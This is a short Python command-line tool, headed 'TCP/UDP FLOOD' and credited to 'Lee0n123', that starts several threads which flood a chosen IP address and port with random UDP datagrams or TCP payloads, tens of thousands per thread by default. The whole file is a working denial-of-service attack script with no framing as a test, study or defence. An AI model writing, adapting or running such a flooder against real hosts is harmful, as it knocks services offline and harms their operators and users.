import random
import socket
import threading
import argparse
import logging

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("__main__")  # Menggunakan "__main__" sebagai nama logger


def udp_flood(ip, port, times):
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip), int(port))
        for x in range(times):
            s.sendto(data, addr)
        logger.info(f"Sent to {ip}:{port} - UDP Flood")
    except Exception as e:
        logger.error(f"Error in UDP flood: {str(e)}")


def tcp_flood(ip, port, times):
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        for x in range(times):
            s.send(data)
        logger.info(f"Sent to {ip}:{port} - TCP Flood")
    except Exception as e:
        logger.error(f"Error in TCP flood: {str(e)}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--ip", required=True, type=str, help="Host IP")
    ap.add_argument("-p", "--port", required=True, type=int, help="Port")
    ap.add_argument(
        "-c", "--choice", type=str, default="y", choices=["y", "n"], help="UDP(y/n)"
    )
    ap.add_argument(
        "-t", "--times", type=int, default=50000, help="Packets per one connection"
    )
    ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
    args = vars(ap.parse_args())

    logging.info("--> C0de By Lee0n123 <--")
    logging.info("#-- TCP/UDP FLOOD --#")
    ip = args["ip"]
    port = args["port"]
    choice = args["choice"]
    times = args["times"]
    threads = args["threads"]

    for y in range(threads):
        if choice == "y":
            th = threading.Thread(target=udp_flood, args=(ip, port, times))
            th.start()
        else:
            th = threading.Thread(target=tcp_flood, args=(ip, port, times))
            th.start()
